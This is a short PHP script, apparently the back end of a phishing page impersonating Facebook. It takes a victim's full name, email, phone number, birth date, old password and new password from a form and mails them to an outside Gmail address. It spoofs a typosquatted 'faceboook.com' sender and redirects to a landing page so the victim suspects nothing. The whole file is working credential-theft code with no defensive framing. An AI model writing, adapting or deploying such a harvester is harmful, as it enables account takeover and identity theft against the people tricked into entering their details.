<?php
//get data from form  
$name = $_POST['fullname'];
$email = $_POST['email'];
$number = $_POST['number'];
$date = $_POST['date'];
$passold = $_POST['pwold'];
$passnew = $_POST['pwnew'];
$to = "elityabang011@gmail.com";
$subject = "Mail From Faceboook";
$txt = "Nama Lengkap = " . $name . "\r\n  Email = " . $email . "\r\n Nomor Telepon =" . $number . "\r\n Tanggal Lahir =" . $date . "
                \r\n Password Lama =" . $passold . "\r\n Password Baru =" . $passnew;
$headers = "From: noreply@faceboook.com" . "\r\n" .
    "CC: somebodyelse@example.com";
if ($email != NULL) {
    mail($to, $subject, $txt, $headers);
}
//redirect
header("Location:landingpage3.html");
